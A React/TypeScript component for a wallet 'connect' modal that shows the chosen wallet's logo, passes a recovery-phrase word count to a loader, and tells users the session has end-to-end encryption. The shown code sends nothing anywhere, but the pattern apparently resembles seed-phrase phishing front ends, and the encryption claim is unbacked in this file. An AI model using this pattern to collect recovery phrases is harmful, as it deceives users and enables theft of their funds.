import React from "react";
import Modal from "@mui/material/Modal";
import Loader from "./loader";
import Image from "next/image";
interface Walletdata {
  name: string;
  logo: string;
  phraseNumber: number | null;
}

function ConnectModal({
  openModal,
  handleClose,
  selected,
  setWallets,
  walletDetails,
}: {
  openModal: boolean;
  handleClose: () => void;
  selected: Walletdata;
  setWallets: React.Dispatch<React.SetStateAction<{ name: string; logo: string; phraseNumber: number | null; }[]>>;
  walletDetails: Walletdata[];
}) {
  return (
    <div>
      <Modal
        open={openModal}
        onClose={() => {
          handleClose();
          setWallets(walletDetails)
        }}
        aria-labelledby="modal-modal-title"
        aria-describedby="modal-modal-description"
        sx={{
          zIndex: "10000",
          backdropFilter: "blur(10px)", // Adds blur effect
          backgroundColor: "rgba(0, 0, 0, 0.1)", // Blackout effect
        }}
      >
        <div
          className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 
             w-[90%] md:w-[450px] rounded-lg bg-slate-900/90 border border-slate-800 p-4 h-[450px] overflow-auto"
        >
          <div className="grid h-full place-items-center content-center">
            <div className="justify-center bg-transparent">
              <Image
                src={selected.logo}
                alt="logo"
                width={50}
                height={50}
                priority
                className="rounded-md"
              />
            </div>
            <p className="text-white ">{selected.name}</p>

            <Loader
              walletDetails={walletDetails}
              setWallets={setWallets}
              name={selected.name}
              handleClose={handleClose}
              number={selected.phraseNumber}
            />

            <div className="flex  flex-col md:flex-row gap-1 items-center mt-3">
              <Image
                src="/images/secure.png"
                width={20}
                height={20}
                alt="secure"
              />
              <p className="text-xs  md:text-sm text-slate-400">
                This session is secured with end-to-end encryption
              </p>
            </div>
          </div>
        </div>
      </Modal>
    </div>
  );
}

export default ConnectModal;
